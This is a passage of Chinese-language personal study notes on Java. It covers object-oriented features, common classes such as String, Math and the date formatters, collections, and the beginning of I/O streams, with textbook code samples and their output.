public Person(int age){ this.age = age; } } // this调用成员方法 class Person{ public void openMouth(){ ... } public void speak(){ this.openMouth(); } } // this调用构造方法 /* 注意： 1.只能在构造方法中使用this调用其他构造方法，不能在类的成员方法中调用 2.在构造方法中，使用this调用构造方法必须是该方法的第一条执行语句，且只能出现一次 3.不能在一个类的两个构造方法中使用this互调 */ class Person{ public Person(){ ... } public Person(int age){ this();\t// 调用无参构造方法 } } 3.7static关键字 静态变量 静态变量所定义的对象可以被所有实例共享。\n类名.变量名; class Student { static String schoolName; } public class Example { public static void main(String[] args){ Student s1 = new Student(); Student s2 = new Student(); Student.schoolName = \u0026#34;西安交通大学\u0026#34;; System.out.println(\u0026#34;我是\u0026#34; + s1.schoolName + \u0026#34;的学生\u0026#34;); System.out.println(\u0026#34;我是\u0026#34; + s2.schoolName + \u0026#34;的学生\u0026#34;); } } /* 输出结果： 我是西安交通大学的学生 我是西安交通大学的学生 */ 注意：static关键字只能修饰成员变量，不可以修饰局部变量 静态方法 有时候，开发人员希望在不创建对象的情况下就可以调用某个方法，这种情况下可以使用静态方法。\n静态方法的定义十分简单，只需在类中定义的方法前面加上static关键字即可。\n// 访问 类名.方法 or 实例对象名.方法 class Person{ public static void say(){ ... } } public class Example{ public static void main(String[] args){ Person.say(); // 或者 Person p = new Person(); p.say(); } } 静态代码块 static { ... } // 静态代码块只在类的第一次使用时会被加载，并且只会被加载一次 第四章 面向对象（下） 4.1 类的继承 继承的概念 语法格式\n/* [修饰符] class 子类名 extends 父类名{ ... } 修饰符可选，默认default */ class Animal{ ... } class Dog extends Animal{ ... } /* 1.子类在继承父类时，会自动拥有父亲所有公共的成员 2.Java中，类只支持单继承，不允许多重继承，也就是一个类只有一个父亲 3.多个类可以继承同一个父类 4.可以多层继承，一个类的父类可以再继承另外的父类 */ 重写父类方法 子类中重写的方法需要和父类被重写的方法具有相同的方法名、参数列表以及返回值类型 不能使用比父类重写方法更加严格访问权限 super关键字 使用super关键字调用父类的成员变量和成员方法\nsuper.成员变量\nsuper.成员方法([参数1, 参数2\u0026hellip;])\n使用super关键字调用父类构造方法，并且只能放在子类第一行，只能出现一次\nsuper([参数1, 参数2, \u0026hellip;])\n4.2 final关键字 特性：\nfinal修饰的类不能被继承 final修饰的方法不能被子类重写 final修饰的变量是常量，只能赋值一次 4.3抽象类和接口 抽象类 基本语法格式\n/* // 定义抽象类 [修饰符] abstract class 类名{ // 定义抽象方法 [修饰符] abstract 返回值类型 方法名 (参数列表); // 其他方法和属性 } */ 包含抽象方法的类必须定义为抽象类，但是抽象类中可以不包含任何抽象方法 抽象类不可以被实例化，如果要调用可以定义一个子类，在子类中实现 接口 如果一个类中所有方法都是抽象的，那么这个类是接口（JDK8中重新定义，还可以有默认方法和静态方法，默认方法使用default修饰，静态方法使用static修饰，而且这两种方法都允许有方法体） 与定义类不同的是，定义接口不再使用class关键字，而是使用interface关键字来声明 [修饰符] interface 接口名 [extends 父接口1, 父接口2, ...]{ [public] [static] [final] 常量类型 常量名 = 常量值; [public] [abstract] 方法返回值类型 方法名 (参数列表); [public] default 方法返回类型值 方法名 (参数列表){ ... } [public] static 方法返回值类型 方法名 (参数列表){ ... } } 定义接口实现类 [修饰符] class [extends 父类名] [implements 接口1, 接口2, ...]{ ... } 当一个类实现接口，如果这个类是抽象类，只需要实现接口中的部分抽象方法即可，否则需要实现所有抽象方法 一个类可以通过implements实现多个接口 class A extends B implements C{ // 需要先继承再实现接口，extends需要放在implements前面 ... } 4.4多态 多态是指不同类的对象在调用一个方法时所呈现的不同动行为。解决方法同名的问题，并且使程序更加灵活，从而有效的提高了程序的可拓展性和可维护性。\n对象类型的转换 涉及到子类对象当作父类类型使用的情况，“向上转型”\nAnimal an1 = new Cat();\t// Cat 类当作 Animal 类型来使用 Animal an2 = new Dog();\t// Dog 类当作 Animal 类型来使用 // 注意，此时不能通过父类去调用子类特有的方法 instanceof 判断一个对象是否为某个类/接口的的实例或者子类实例\n/* 对象（或对象引用变量）instanceof 类（或接口） */ if (an1 instanceof Cat){ Cat cat = (Cat)an1; } 4.5 内部类 成员内部类 在一个类中除了可以定义变量、成员方法还可以定义类，这样的类称为内部类。\nclass Outer{ int m = 0; void test1(){ ... } class Inner{ int n = 1; void show1(){ } void show2(){ } } // 定义外部类方法，访问内部类变量和方法 void test2(){ Inner inner = new Inner(); } } // 测试类 public static void main(String[] args){ Outer outer = new Outer(); Outer.Inner inner = outer.new Inner(); // 注意这里有两种情况创建内部类 /* 1.如果已有初始化的外部类对象： Outer.Inner inner = outer.new Inner(); 2.如果没有已经初始化的外部类对象: Outer.Inner inner = new Outer().new Inner(); */ inner.show1(); outer.test2(); } 局部内部类 局部内部类，也叫方法内部类。就是在定义到某个局部范围中的类；它和局部变量一样，都是在方法中进行定义，其有效值仅限于方法内部。\nclass Outer{ void test1(){ ... } void test2(){ class Inner{ void show(){ test1(); } } } } 局部类可以访问外部类所有成员，而只有包含在局部内部类的方法才可以访问内部类中的所有成员。\n静态内部类 静态内部类就是使用static关键字修饰的成员内部类。\n形式上：静态内部类前增加了static关键字 功能上：静态内部类只能访问外部类的静态成员，同时，通过外部类访问静态内部类成员时。可以跳过外部类直接通过内部类访问 /* 外部类名.静态内部类名 变量名 = new 外部类名.静态内部类名(); */ // 定义外部类 class Outer{ static int m = 0; static class Inner{ void show(){ ... } } } public class Example{ public static void main(String[] args){ // 静态内部类可以直接通过外部类创建 Outer.Inner inner = new Outer.Inner(); inner.show(); } } 匿名内部类 在Java中调用某个方法时，如果该方法的参数是一个接口类型，除了可以传入一个参数接口实现类，还可以使用匿名内部类实现接口来作为该方法的参数。\n/* new 父接口(){ //匿名内部类实现部分 } */ interface Animal{ void shout(); } public class Example{ public static void main(String[] args){ String name = \u0026#34;小花\u0026#34;; // 定义匿名内部类作为参数传递给Animal shout方法 animalShout (new Animal(){ // 实现shout方法 public void shout(){ ... } }); } // 定义静态方法animalShout，接受接口类型参数 public static void animalShout(Animal an){ an.shout(); } } 4.6 JDK8的Lambda表达式 使用简洁的表达式来表达一个接口，同时Lambda表达式也简化了对集合以及数组数据的遍历、过滤、提取等操作。\n入门 一个Lambda表达式由三个部分组成，分别为参数列表、\u0026quot;-\u0026gt;\u0026ldquo;和表达式主体。\n/* ([数据类型 参数名, 数据类型 参数名, ...]) -\u0026gt; {表达式主体} */ interface Animal{ void shout(); } public class Example{ public static void main(String[] args){ String name = \u0026#34;xiaohua\u0026#34;; animalShout(()-\u0026gt;System.out.println(\u0026#34;...\u0026#34;))； } public static void animalShout(Animal an){ ... } } 函数式接口 接口中有且只有一个抽象方法时才可以使用Lambda表达式代替匿名内部类\n// 这个例子有些瞎写噢~ package review; @FunctionalInterface interface ann{ void shout(); } interface cc{ int sum(int a, int b); } public class test{ public static void main(String[] args){ as(()-\u0026gt;System.out.println(\u0026#34;asd\u0026#34;)); s(10, 20, (x, y)-\u0026gt;x+y); } private static void as(ann a){ a.shout(); } private static void s(int x, int y, cc c){ c.sum(x, y); } } 方法引用和构造器引用 看课本我没多少印象就不写啦\n4.7异常 Error：错误类，表示Java运行时产生的系统内部错误或者资源耗尽的错误，是比较严重的 Exception：异常类，表示程序本身可以处理的错误 异常的类型 编译时的异常 运行时的异常 try\u0026hellip;catch 和 finally 异常捕获\ntry{ // 可能出现异常的地方 }catch(Exception 类或者其子类 e){ // 异常捕获处理 }finally{ // 有些时候，我们希望有些语句无论是否发生异常都要执行，就使用finally throws关键字和throw关键字 垃圾回收 第五章 Java中的常用类 5.1 String类和StringBuffer类 String类的初始化 String name = \u0026#34;...\u0026#34;; String name = new String(\u0026#34;...\u0026#34;); 方法声明 功能描述 String() 创建一个内容为空的字符串0 String(String value) 根据指定字符串内容创建对象 String(char[] value) 根据指定的字符数组创建对象 String str1 = new String(); String str2 = new String(\u0026#34;abc\u0026#34;); char[] arr = new char[]{\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;}; String str3 = new String(arr); String类的常见操作 方法声明 功能描述 int index(int ch) 返回字符在字符串中第一次出现位置的索引 int lastIndex(int ch) 最后一次出现位置的索引 int indexOf(String str) 返回指定子串在字符串中第一次出现的位置索引 int lastIndexOf(String str) 子串最后一次出现位置的索引 char charAt(int index) 返回index位置上的字符 boolean endsWith(String str) 判断字符串是否以指定字符串结尾 int length() 返回长度 boolean equals 字符串与指定字符串比较 boolean isEmpty() 当且仅当字符串长度为零时，返回true boolean startsWith(String str) 字符串是否以指定字符串开头 boolean contains(CharSequence cs) 字符串是否包含指定字符序列 String toLowerCase() 字符串转化成小写 String toUpperCase() 转化为大写 static String valueOf(int i) 返回int参数的字符串表示形式 char[] toCharArray() 字符串转化为一个字符数组 String replace(CharSequence oldstr,CharSequence newstr) 返回新的字符串，newstr代替旧字符串中所有的oldstr String[] split(String regex) 根据参数regex（一个正则表达式）分割成若干字符串 String substring(int beginIndex) 返回从beginIndex角标开始的字符串直到最后 String substring(int beginIndex, int endIndex) 返回从 beginIndex 到 endIndex-1 的角标字符串 String trim() 返回新字符串，去掉首尾空格 StringBuffer类 为了便于对字符串进行修改，在JDK中提供了一个StringBuffer类（也称字符串缓冲区）来操作字符串。\nStringBuffer类的内容和长度是可以改变的，类似于一个字符容器，在进行添加删除时不会产生新的StringBuffer对象。\n方法声明 功能描述 StringBuffer append(char c) 添加字符到字符串末尾 StringBuffer insert(int offset, String str) 在StringBuffer对象中offset位置插入字符串str StringBuffer deleteCharAt(int index) 移出指定位置的字符 StringBuffer delete(int start, int end) 删除对象中指定范围的字符串或者字符串 StringBuffer replace(int start, int end, String s) 将StringBuffer对象中指定范围内的字符或者字符串用新的字符串s表示 void setCharAt(int index, char ch) 修改指定位置处的字符 String toString() 返回StringBuffer缓冲区的字符串对象 StringBuffer reverse() StringBuffer对象用其反转形式取代 String和StringBuffer的不同\nString长度不可以改变，StringBuffer可以改变 String类重写了equals()方法，StringBufer没有重写 String类对象可以用“+”操作符进行连接，但是StringBuffer不可以 5.2System类与Runtime类 System类 方法声明 功能描述 static void exit(int status) 终止当前正在运行的Java虚拟机，statues为状态码，非0异常终止 static void gc() 运行垃圾回收器回收垃圾 static native long currentTimeMillis() 返回以毫秒为单位的当前时间 static void arraycopy(Object scr, int scrPos, Object dest, int destPos, int length) 从scr引用的指定原数组拷贝到dest引用的数组，拷贝从指定位置开始，到目标数组指定位置结束 static Properties getProperties() 获取当前的系统属性 static String getProperties() 获取当前的系统属性 static String getProperty(String key) 获取指定键描述的系统属性 Runtime类 Runtime run = Runtime.getRuntime(); run.availableProcessors();\t// 处理器个数 run.freeMemory();\t// 空闲内存大小 run.maxMemory();\t// 最大可用内存大小 5.3 Math类与Random类 Math类 package example5; public class example15 { public static void main(String[] args) { System.out.println(\u0026#34;计算绝对值的结果：\u0026#34; + Math.abs(-1)); System.out.println(\u0026#34;计算正弦的结果：\u0026#34; + Math.sin(1.57)); System.out.println(\u0026#34;计算余弦的结果：\u0026#34; + Math.cos(2.0)); System.out.println(\u0026#34;计算正切的结果：\u0026#34; + Math.tan(0.8)); System.out.println(\u0026#34;计算平方根的结果：\u0026#34; + Math.sqrt(4)); System.out.println(\u0026#34;计算立方根的结果：\u0026#34; + Math.cbrt(9)); System.out.println(\u0026#34;计算乘方的结果：\u0026#34; + Math.pow(2, 2)); System.out.println(\u0026#34;求大于参数的最小整数：\u0026#34; + Math.ceil(4.6)); System.out.println(\u0026#34;求小于参数的最大整数：\u0026#34; + Math.floor(-5.2)); System.out.println(\u0026#34;对小数进行四舍五入后的结果：\u0026#34; + Math.round(-8.6)); System.out.println(\u0026#34;求两个数中的最大值：\u0026#34; + Math.max(5.1, 5.5)); System.out.println(\u0026#34;求两个数的最小值：\u0026#34; + Math.min(5.1, 5.5)); System.out.println(\u0026#34;生成一个大于0.0小于1.0的随机值：\u0026#34; + Math.random()); } } /* 控制台输出： 计算绝对值的结果：1 计算正弦的结果：0.9999996829318346 计算余弦的结果：-0.4161468365471424 计算正切的结果：1.0296385570503641 计算平方根的结果：2.0 计算立方根的结果：2.080083823051904 计算乘方的结果：4.0 求大于参数的最小整数：5.0 求小于参数的最大整数：-6.0 对小数进行四舍五入后的结果：-9 求两个数中的最大值：5.5 求两个数的最小值：5.1 生成一个大于0.0小于1.0的随机值：0.5382268154233723 */ Random类 两个构造方法\nRandom()\t// 用于创建一个随机数生成器，每次实例化Random对象会生成不同的随机数 Random(long seed) // 使用long型的随机数种子创建伪随机数生成器，当seed相同时，每次实例化Random对象\t会生成相同的随机数 常用类方法\n方法声明 功能描述 boolean nextBoolean() 随机生成boolean类型的随机数 double nextBoolean() 随机生成double类型的随机数 float nextFloat() 随机生成float类型的随机数 int nextInt() 随机生成int类型的随机数 int nextInt(int n) 随机生成[0, n)之间的int类型的随机数 long nextLong() 随机生成long类型的随机数 5.4包装类 package example5; public class example18 { public static void main(String[] args) { //通过String.valueOf()方法将基本类型转换为字符串 int num=123; String string = String.valueOf(num); System.out.println(\u0026#34;将 int 变量转换为字符串的结果：\u0026#34; + string); //通过包装类的静态方法将基本数据类型和字符串类型转换为对应的包装类 String str = \u0026#34;998\u0026#34;; Integer integer = Integer.valueOf(num); Integer integer2 = Integer.valueOf(str); System.out.println(\u0026#34;将 int 变量转换为对应包装类的结果：\u0026#34; + integer); System.out.println(\u0026#34;将字符串变量转换为对应包装类的结果：\u0026#34; + integer2); //通过包装类的构造方法将基本数据类型和类型匹配的转换为包装类； Integer integer3 = new Integer(num); Integer integer4 = new\tInteger(str); System.out.println(\u0026#34;通过构造器将 int 类型的变量转换为包装类的结果：\u0026#34; + integer3); System.out.println(\u0026#34;通过构造器将字符串变量转换为包装类的结果：\u0026#34; + integer4); //通过包装类的parse···()方法将，字符串变量转换为基本类型 int parseInt = Integer.parseInt(str); System.out.println(\u0026#34;将字符串换为基本类型的结果：\u0026#34; + parseInt); //通过包装类的toString()方法将包装类转换为字符串 String string2 = integer.toString(); System.out.println(\u0026#34;将包装类转换为字符串的结果：\u0026#34; + string2); } } /* 控制台输出： 将 int 变量转换为字符串的结果：123 将 int 变量转换为对应包装类的结果：123 将字符串变量转换为对应包装类的结果：998 通过构造器将 int 类型的变量转换为包装类的结果：123 通过构造器将字符串变量转换为包装类的结果：998 将字符串换为基本类型的结果：998 将包装类转换为字符串的结果：123 */ 5.5日期与时间类 Date类 在JDK的java.util包中，提供了Date类表示日期和时间。\n// 构造方法 Date(); Date(long date);\t// date时是1970/01/01 00:00以来的时间戳 Calender类 抽象类，不可以被实例化\nCalendar calendar = Calendar.getInstance(); int get(int field);\t// 返回指定日历字段的值 void add(int field, int amount);\t// 为日历字段增加或者减去指定的时间量 void set(int field, int value);\t// 为指定日历设置值 void set(int year, int month, int date);\t// 设置Calendar对象的年、月、日三个字段的值 void set(int year, int month, int date, int hour, int min, int sec); // 设置年月日时分秒 // 获取当前计算机时间 package example5; import java.util.*; public class example20 { public static void main(String[] args) { Calendar calendar = Calendar.getInstance(); int year = calendar.get(Calendar.YEAR); int month = calendar.get(Calendar.MONTH) + 1; int day = calendar.get(Calendar.DATE); int hour = calendar.get(Calendar.HOUR); int minute = calendar.get(Calendar.MINUTE); int second = calendar.get(Calendar.SECOND); System.out.println(\u0026#34;当前的时间为：\u0026#34; + year + \u0026#34;年\u0026#34; + month + \u0026#34;月\u0026#34; + day + \u0026#34;日\u0026#34; + hour + \u0026#34;时\u0026#34; + minute + \u0026#34;分\u0026#34; + second + \u0026#34;秒\u0026#34;); } } /* 控制台输出： 当前的时间为：2019年6月8日2时25分13秒 */ 5.6 格式化类 DateFormat类 常用方法\n方法声明 功能描述 static DateFormat getDateInstance() 创建默认日期格式器 static DateFormat getDateInstance(int style) 创建指定格式化风格的日期格式器 static DateFormat getDateTimeInstance() 创建默认风格的日期/时间格式器 static DateFormat getDateTimeInstance(int dataStyle, int timeStyle) 创建制定格式化风格的时间/日期格式器 String format(Date date) 将一个Date格式化为日期。时间字符串 Date parse(String source) 将指定字符串解析为一个日期 package example5; import java.text.*; import java.util.*; public class example24 { public static void main(String[] args) { Date date = new Date(); //full格 DateFormat fullFormat = DateFormat.getDateInstance(DateFormat.FULL); //Long格式 DateFormat longFormat = DateFormat.getDateInstance(DateFormat.LONG); //MEDIUM格式 DateFormat mediumFormat = DateFormat.getDateInstance(DateFormat.MEDIUM ); //SHORT格式 DateFormat shortFormat = DateFormat.getDateInstance(DateFormat.SHORT); //下面打印格式化之后的日期时间 System.out.println(\u0026#34;当前时间的完整格式为：\u0026#34; + fullFormat.format(date)); System.out.println(\u0026#34;当前时间的长格式为：\u0026#34; + longFormat.format(date)); System.out.println(\u0026#34;当前时间的普通格式为：\u0026#34; + mediumFormat.format(date)); System.out.println(\u0026#34;当前时间的短格式为：\u0026#34; + shortFormat.format(date)); } } SimpleDateFormat类 package example5; import java.text.DateFormat; import java.text.ParseException; public class example25 { public static void main(String[] args) throws ParseException { DateFormat dt1 = DateFormat.getDateInstance(); //long DateFormat dt2 = DateFormat.getDateInstance(DateFormat.LONG); //String str1 = \u0026#34;2018-01-27\u0026#34;; String str2 = \u0026#34;2018年01月27日\u0026#34;; //输出解析成date对象后的结果 //System.out.println(dt1.parse(str1)); System.out.println(dt2.parse(str2)); } } // Sat Jan 27 00:00:00 CST 2018 DateTimeFormatter类 相当于DateFormat和SimpleDateFormat类的合体\n完成时间和日期格式化：\npackage example5; import java.time.*; import java.time.format.*; public class example28 { public static void main(String[] args) { LocalDateTime date = LocalDateTime.now(); //创建DateTimeFormatter System.out.print(\u0026#34;使用常量创建 DateTimeFormatter：\u0026#34;); DateTimeFormatter dtf1 = DateTimeFormatter.ISO_DATE_TIME; System.out.println(dtf1.format(date)); //MEDIUM System.out.print(\u0026#34;使用MEDIUM类型风格的DateTimeFormatter：\u0026#34;); DateTimeFormatter dtf2 = DateTimeFormatter .ofLocalizedDateTime(FormatStyle.MEDIUM); System.out.println(dtf2.format(date)); System.out.print(\u0026#34;根据模式字符串创建 DateTimeFormatter：\u0026#34;); DateTimeFormatter dtf3 = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); System.out.println(date.format(dtf3)); } } /* 使用常量创建 DateTimeFormatter：2019-06-08T14:49:04.400044 使用MEDIUM类型风格的DateTimeFormatter：2019年6月8日 下午2:49:04 根据模式字符串创建 DateTimeFormatter：2019-06-08 14:49:04 */ 解析字符串：\npackage example5; import java.time.*; import java.time.format.*; import java.util.Date; public class example29 { public static void main(String[] args) { //两种格式 String str1 = \u0026#34;2018-01-27 12:38:36\u0026#34;; String str2 = \u0026#34;2018年01月29日15时01分20秒\u0026#34;; //定义解析格式器 DateTimeFormatter f1 = DateTimeFormatter .ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); DateTimeFormatter f2 = DateTimeFormatter. ofPattern(\u0026#34;yyyy年MM月dd日HH时mm分ss秒\u0026#34;); //LocalDateTime的parse方法解析 LocalDateTime l1 = LocalDateTime.parse(str1, f1); LocalDateTime l2 = LocalDateTime.parse(str2, f2); //输出结果 System.out.println(l1); System.out.println(l2); } } /* 2018-01-27T12:38:36 2018-01-29T15:01:20 */ 第六章 集合 6.1 集合概述 集合按照存储结构分为两大类：\nCollection：单列集合的根接口，用于存储一系列符合某种规则的元素 Collection集合有两个重要的子接口，分别是List和Set List集合的特点是元素有序、可重复 Set集合的特点是元素无序且不可重复 List接口实现类主要有ArrayList和LinkedList Set类接口的主要实现类有HashSet和TreeSet Map：双列集合的根接口，用于存储具有键（Key）、值（Value）映射关系的元素 Map的每个元素都包含一对键值 Key是唯一的，使用Map集合时可以通过指定的Key值找到对应的Value Map的接口实现类主要有HashMap和TreeMap 6.2 Collection接口 定义了单列结合所有方法（List和set）一些通用方法，可用于操作所有单列集合\n方法声明 功能描述 boolean add(Object o) 向集合中添加一个元素 boolean addAll(Collection c) 将指定c中的所有元素添加到该集合中 void clear() 删除该集合中所有元素 boolean remove(Object o) 删除该集合中指定的元素 boolean removeAll(Collection) 删除该集合中包括指定集合c中的所有元素 boolean isEmpty() 判断该集合是否为空 boolean contains(Object o) 判断集合中是否包含某个元素 boolean contains(Colleciton c) 判断集合中是否包含指定集合c中的所有元素 Iterator iterator() 返回在该集合的元素上进行迭代的迭代器，用于遍历集合所有元素 int size() 获取该集合元素个数 Stream\u0026lt;E\u0026gt; stream() 将集合源转换为有序元素的流对象 6.3 List接口 List接口简介 List集合中允许出现重复的元素，所有的元素是按照一种线性方式进行存储的。\nList集合中元素有序，即存入顺序和取出顺序一致\nList集合特有方法\n方法声明 功能描述 void add(int index, Object element) 将元素插到指定位置 boolean addAll(int index, Collection c) 将集合c中的所有元素插到指定位置 Object get(int index) 返回索引位置的元素 Object remove(int index) 删除索引位置的元素 Object set(int index, Object element) 将索引位置处的元素替换为element，并返回替换后的元素 int indexOf(Object o) 返回对象o在List集合中首次出现的位置索引 int lastIndexOf(Object o) 返回对象o在集合中最后一次出现的位置索引 List subList(int fromIndex, int toIndex) 返回子集合，从fromIndex（包括）到toIndex（不包括） Object[ ] toArray() 将集合元素转化为数组 default void sort(Comparator\u0026lt;? super E\u0026gt; c) 根据指定的比较器集合对元素进行排序 ArrayList集合 内部数据结构数组形式，在遍历和查找时高效，不适合做大量的增删\nLinkedList集合 内部有双向循环链表，增删操作高效\n特有方法\n方法声明 功能描述 void add(int index, E element) 指定位置插入元素 void addFirst(Object o) 指定元素插入集合开头 void addLast(Object o) 元素插入集合结尾 Object getFirst() 返回集合的第一个元素 Object getLast() 返回集合的最后一个元素 Object removeFirst() 移除并返回集合的第一个元素 Object removeLast() 移除并返回集合的最后一个元素 boolean offer(Object o) 指定元素添加到集合结尾 boolean offerFirst(Object o) 指定元素添加到集合开头 boolean offerLast(Object o) 指定元素添加到集合结尾 Object peek() 获取集合第一个元素 Object peekFirst() 获取集合第一个元素 Object peekLast() 获取集合最后一个元素 Object poll() 移除并返回集合第一个元素 Object pollFirst() 移除并返回集合第一个元素 Object pollLast() 移除并返回集合最后一个元素 void push(Object o) 指定元素添加到集合开头 Object pop() 移出并返回集合第一个元素 6.4 Collection集合遍历 Iterator遍历集合 Iterator是集合框架一员，但是它是主要用于迭代访问（即遍历）Collection中的元素，因此Iterator对象也被称为迭代器。\npackage example6; import javax.swing.text.html.HTMLDocument; import java.util.ArrayList; import java.util.Iterator; public class example3 { public static void main(String[] args){ ArrayList list = new ArrayList(); //添加字符串 list.add(\u0026#34;data_1\u0026#34;); list.add(\u0026#34;data_2\u0026#34;); list.add(\u0026#34;data_3\u0026#34;); //获取Iterator对象 Iterator iterator = list.iterator(); while (iterator.hasNext()){ //判断集合中是否存在下一个元素 Object obj = iterator.next(); System.out.println(obj); } } } /* data_1 data_2 data_3 */ foreach遍历集合 /* for(容器中元素类型 临时变量 : 容器变量){ // 执行语句 } */ package example6; import java.util.ArrayList; public class example4 { public static void main(String[] args){ ArrayList list = new ArrayList(); list.add(\u0026#34;data_1\u0026#34;); list.add(\u0026#34;data_2\u0026#34;); list.add(\u0026#34;data_3\u0026#34;); //foreach遍历集合 for (Object obj:list){ System.out.println(obj); } } } /* data_1 data_2 data_3 */ 注意：使用foreach进行循环遍历时不可以改变数组中元素的值 JDK8中的forEach遍历集合 根据Lambda表达式增加的方法\nimport java.util.ArrayList; public class Example{ public static void main(String[] args){ ArrayList list = new ArrayList(); list.add(\u0026#34;data_1\u0026#34;); list.add(\u0026#34;data_2\u0026#34;); list.add(\u0026#34;data_3\u0026#34;); System.out.println(list); list.forEach(obj-\u0026gt;System.out.println(\u0026#34;迭代集合元素：\u0026#34; + obj)); } } /* [data_1, data_2, data_3] 迭代集合元素：data_1 迭代集合元素：data_2 迭代集合元素：data_3 */ 6.5 Set接口 Set接口和List接口一样，同样继承自Collection接口，它与Collection接口中的方法基本一致。\nSet接口中的元素无序，并且都会以某种规则保证存入的元素不出现重复。\nSet接口主要有两个实现类，分别是HashSet和TreeSet：\nHashSet：根据对象的Hash值来确定对象在集合中的存储位置，具有良好的存取和查找性能。 TreeSet：以二叉树的方式来存储元素，可以实现对集合元素中所有元素进行排序。 HashSet集合 如果元素类型是自定义类型，则使用此集合不会消除重复元素，这就需要我们重写hashCode()和equals()方法 TreeSet集合 TreeSet集合是Set接口的另一个实现类，内部采用平衡二叉树存储元素，可以保证集合中无重复元素，并且可以对元素进行排序\nTreeSet集合在继承Set集合接口的基础上一些特有的方法\n方法声明 功能描述 Object first() 返回TreeSet集合的首个元素 Object last() 返回集合最后一个元素 Object lower(Object o) 返回集合中小于给定元素的最大元素，如果没有返回null Object floor(Object o) 返回集合中小于等于给定元素的最大元素，如果没有返回null Object higher(Object o) 返回集合中大于给定元素的最小元素，如果没有返回null Object ceiling(object o) 返回集合中大于等于给定元素的最小元素，如果没有返回null Object pollFirst() 移除并返回集合中第一个元素 Object pollLast() 移出并返回集合中最后一个元素 通过Compare接口实现CompareTO()方法进行排序，其中重写函数定制排序，P209\n6.6 Map接口 Map接口简介 双列集合，每个元素包含 Key 和 Value，存在映射关系。\nMap集合常用方法\n方法声明 功能描述 void put(Object key, Object value) 向Map集合中添加Key-Value映射对象 int size() 返回键值对个数 Object get(Object key) 返回键所映射的值，没有返回null boolean containsKey(Object key) 查看是否包含指定的键对象key boolean containsValue(Object value) 查看是否包含指定的值对象value Object remove(Object key) 删除并返回Key对象键值映射元素 void clear() 清空键值映射元素 Set keySet() 以Set形式返回集合中所有键对象Key Collection values() 以Collection形式返回Map集合中所有值对象Value Set\u0026lt;Map.Entry\u0026lt;Key,Value\u0026raquo;entry set() 将Map集合转化成存储元素类型为Map的Set集合 boolean replace(Object key, Object value) 指定键值所映射的值改为value boolean remove(Object key, Object value) 删除Map中键值同时匹配的元素 HashMap集合 HashMap是Map接口的一个实现类，用于存储键值映射关系，集合键值允许为空，但是键不能重复，而且集合中的元素是无序的。\n底层由哈希表组成，其实是“数组+链表”，对于元素的增、删、查、改操作效率都比较高。\npackage example6; import java.util.HashMap; import java.util.Map; public class example14 { public static void main(String[] args){ Map map = new HashMap(); map.put(\u0026#34;1\u0026#34;,\u0026#34;Jack\u0026#34;); map.put(\u0026#34;2\u0026#34;,\u0026#34;Rose\u0026#34;); map.put(\u0026#34;3\u0026#34;,\u0026#34;Lucky\u0026#34;); map.put(\u0026#34;4\u0026#34;,\u0026#34;Lucky\u0026#34;); map.put(\u0026#34;1\u0026#34;,\u0026#34;Tom\u0026#34;); System.out.println(map); // 查看键对象是否存在 System.out.println(map.containsKey(\u0026#34;1\u0026#34;)); System.out.println(map.get(\u0026#34;1\u0026#34;)); System.out.println(map.keySet()); System.out.println(map.values()); map.replace(\u0026#34;1\u0026#34;,\u0026#34;Tom2\u0026#34;); System.out.println(map); map.remove(\u0026#34;1\u0026#34;); System.out.println(map); } } /* {1=Tom, 2=Rose, 3=Lucky, 4=Lucky} true Tom [1, 2, 3, 4] [Tom, Rose, Lucky, Lucky] {1=Tom2, 2=Rose, 3=Lucky, 4=Lucky} {2=Rose, 3=Lucky, 4=Lucky} */ Map集合中键具有唯一性，当向集合中添加已存在的键值元素时，会覆盖以前的键值元素，如果需要可以返回原来的旧值 Map集合遍历 Iterator迭代器遍历 // keySet()方法 Iterator it = keySet.iterator(); while (it.hasNext()){ Object key = it.next(); // 获取每个键所对应的值 Object value = map.get(key); System.out.println(key + \u0026#34;:\u0026#34; + value); } // entrySet()方法 Set entrySet = map.entrySet(); Iterator it = entrySet.iterator(); while(it.hasNext()){ Map.Entry entry = (Map.Entry) (it.next()); // 获取键 Object key = entry.getKey(); // 获取值 Object value = entry.getValue(); System.out.println(key + \u0026#34;:\u0026#34; + value); } forEach方法遍历 map.forEach((key, value)-\u0026gt;System.out.println(key + \u0026#34;:\u0026#34; + value)); LinkedHashMap可以顺序存入和读出 TreeMap集合 用来存储键值映射关系且不允许出现重复的键\n可以通过自定义比较器Comparator方式对所有的键进行定制排序 P221 Properties集合 Hashtable类的子类Properties，主要用于配置文件\n6.7泛型 P223（dbq我整理不完了\u0026hellip;）\n6.8常用工具类 P255\n6.9聚合操作 P232\n第七章 I/O流 7.1 I/O流概述 I/O流有很多种，按照不同的方式可以分为以下三类：\n1.字节流和字符流 根据操作的数据单位不同，可以分为字节流和字符流。\n2.输入流和输出流 根据流传输方向不同，分为输入流和输出流。其中输入流只能从流中读取数据，而不能向里写入数据；输出流只能向流中写入数据，而不能从中读取数据。\n3.节点流和处理流 根据流的功能不同，可以分为节点流和处理流。节点流也称为低级流；处理流（直连数据源）也成为高级流（对节点流封装）。 Java的I/O流主要在java.io包中，其中4个类为流的顶级类：\n字节流 字符流 输入流 InputStream Reader 输出流 OutputStream Writer 这4个顶级类都是抽象类，并且是所有流类型的父类。\n7.2字节流 字节流概述 字节流两个抽象类InputStream和OutputStream是字节流的顶级父类。所有字节输入流继承自InputStream，所有字节输出流继承自OutputStream。\nInputStream从源输入到程序 OutputStream从程序输出到目标设备 注意：都是相对于程序而言 方法声明 功能描述 int read() 从输入流中读取一个8位的字节，转换为0~255之间的整数，并且返回一个整数。当没有字节可读时，将返回-1 int read(by) 从输入流中读取若干个字节，把它们保存到参数b指定的字节数组中，返回读取字节的数目 int read(byte[] b, int off, int len) 从输入流中读取若干字节保存在参数b指定的字节数组中，off是数组开始保存数据起始下标，len为读取字节数目 void close() 关闭此输入流并释放与该流相关的所有系统资源 方法声明 功能描述 void write(int b) 向输出流写一个字节 void write(byte[] b) 把参数b指定的字节数字的所有字节写到输出流 void write(byte[] b, int off, int len) 把b数组从偏移量off开始的len个字节写道输出流 void flush() 刷新此输出流并强制写出所有缓冲流的输出字节 void close() 关闭此输出流并释放与此流相关的所有系统资源 